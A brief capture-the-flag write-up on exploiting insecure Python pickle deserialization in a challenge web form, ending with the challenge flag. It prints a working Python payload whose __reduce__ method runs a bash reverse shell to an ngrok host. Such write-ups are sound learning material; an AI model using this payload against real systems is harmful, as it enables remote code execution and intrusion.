

Page opened to two simple boxes:



Entering random text gets me an error




While googling that I find it is given by a python module called Pickle. Which makes sense considering the title of the challenge references something else that's pickled. Googled around until I found a python script to help https://davidhamann.de/2020/04/05/exploiting-python-pickle/.

I modified it with my own unpickled script to get a reverse shell. Gets me a base64 string I put into the box and while having ngrok and netcat listening, I got a reverse shell then read the flag.

```python
    1 	import pickle
    2 	import base64
    3 	import os
    4 	
    5 	
    6 	class RCE:
    7 		def __reduce__(self):
    8 			return (os.system, ('bash -c "bash -i >& /dev/tcp/2.tcp.ngrok.io/11352 0>&1"',))
    9 	
   10 	
   11 	if __name__ == '__main__':
   12 		pickled = pickle.dumps(RCE())
   13 		print(base64.urlsafe_b64encode(pickled))
```

Flag: SNYK{6854ecb17f51afdf2610f741dd07bd6099c616e4ab1a403eb14fa8639e1fb0af}

